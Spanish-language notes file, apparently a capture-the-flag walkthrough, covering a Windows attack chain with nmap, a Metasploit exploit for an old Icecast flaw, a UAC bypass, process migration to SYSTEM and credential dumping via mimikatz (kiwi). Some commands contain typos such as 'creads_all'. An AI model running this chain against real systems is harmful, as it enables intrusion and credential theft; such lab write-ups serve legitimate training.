@@ -1,0 +1,59 @@
+
+1.Analizar los servicios y versiones corriendo :
+	- nmap -sC -sV -T5 <ip>
+
+2.Una vez analizado vemos que en el puerto 8000 esta corriendo el servicio Icecast,hacemos una busqueda de exploits.
+ 
+	- msfconsole 
+
+	- search icecast
+
+	ya que solo hay un exploit de icecast en metaesploit el cual es la vulnerabilidad de 2004:
+
+	- use 0
+
+	- set PAYLOAD 
+
+	- set LHOST tun0
+
+	- set RHOSTS <ip>
+
+
+3.Una vez conectados a la shell meterpreter podemos usar un exploit para buscar metodos de escala a privilegios :
+	
+	- run post/multi/recon/local_exploit_suggester
+
+	- anotar dicho exploit en mi caso fue : exploit/windows/local/bypassuac_eventvwr
+
+	- background 
+	
+	el exploit se tiene que ejecutar en background y setear la session de meterpreter 
+
+	- use exploit/windows/local/bypassuac_eventvwr
+
+	- sessions -l 
+
+		una vez vimos nuestras sessiones seteamos cualquiera de ellas con:
+	
+	- set SESSION <numero de session>
+
+
+
+4.Escalando Privilegios 
+
+		Para escalar privilegios tenemos que migrar de nuestro proceso actual a otro con NT ATHORIT/SYSYSTEM 
+		
+	- ps 
+
+		NOTA: migrar a algun proceso con la misma arquitectura que el sistema. 
+
+	- migrate <Process_id>
+
+	Listo ya seriamos administrador del sistema ahora a obtener las credenciales 
+
+	- load kiwi : este comando es para cargar mimikatz ,que es un programa para obtener credenciales de usuario
+
+	- creads_all : recupera las credenciales.
+
+	
+	
